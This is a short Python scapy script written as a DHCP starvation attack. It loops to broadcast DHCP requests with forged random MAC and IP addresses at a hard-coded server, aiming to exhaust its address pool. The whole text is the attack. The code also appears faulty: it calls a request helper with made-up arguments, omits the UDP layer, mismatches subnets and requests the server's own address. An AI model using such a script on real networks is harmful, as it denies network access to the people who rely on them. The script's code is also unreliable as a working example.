from scapy.all import *

def dhcp_starvation(dhcp_server, network):
 x=1
 while x<=100:
  mac = RandMAC()
  ip = RandIP("10.1.10.0/24")
  pkt = IP(src=ip,dst=dhcp_server)
  mac = Ether(src=mac,dst="ff:ff:ff:ff:ff:ff")
  dhcp = dhcp_request(req_type='request', requested_addr=dhcp_server)
  frame = mac/pkt/dhcp

  srp(frame)
  x+=1

dhcp_starvation("10.1.30.1", "10.1.30.0/24")